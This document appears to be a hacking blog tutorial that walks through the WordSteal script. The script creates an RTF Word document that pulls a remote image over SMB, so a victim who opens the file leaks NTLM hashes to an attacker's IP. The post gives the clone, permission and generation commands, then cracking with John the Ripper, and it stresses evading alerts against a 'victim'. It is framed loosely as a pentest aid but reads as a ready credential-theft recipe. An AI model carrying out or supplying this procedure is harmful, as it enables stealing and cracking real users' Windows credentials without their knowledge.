# Stealing-Windows-credentials-using-MS-Office-Document
Stealing Windows credentials using MS Office Document


 Hello my little Freaks ! Hackfreaks here .Today you will find something incredible in this article related to a recently launched script called "WORD STEAL", which can increasingly define your hacking skills. Brought to you by hackfreaks official. This script will create a POC that will steal NTLM hashes from the remote computer.

 
 Microsoft Word can include images from remote locations.  This is an undocumented feature, but malware creators discovered that it was being used to add images via http to get statistics.  We can also enable remote files on the SMB server and the victim will authenticate using their credentials.  This is very useful during pentests because it allows you to steal credentials without triggering any alerts, and most security applications do not detect this.

 
 First, we need to download it from Github, open a terminal in Kali Linux and enter the following command.


◾️ git clone


https://github.com/0x090x0/WordSteal.git

 
 Now open the downloaded word steal folder where you will get the "main.py" python script and grant all permissions to the main.py script if needed.

 
 chmod 777 main.py


As the author described, this script will convert an image or say .jpg to .rtf (Microsoft Word file).  The Rich Text Format is a proprietary published specification document file format developed by Microsoft for cross-platform document exchange with Microsoft products.  ...


After that, download the image and save it in the Wordsteal folder, since I currently have a "1.jpg" image, we need to enter the following command which generates an .rtf file that steals NTLM hashes from the remote computer.


python main.py 192.168.0.104 1.jpeg 1

 
 The above command will generate a .rtf file as you can see in this screenshot after sending the 1.rtf file to the remote computer.


When the victim opens 1.rtf (like a Microsoft Word file) on their system, on the other hand, the attack will receive NTLM hashes.


Inside Word Steal, we have stolen credentials without triggering any alerts, which you can observe in the following image.  Now use john the ripper password cracking tool to crack the hashes in the netntlmv2 password file, or enter the following command:


John password_netntlmv2


Cool!  We can see victim's credentials that can be used to log in.
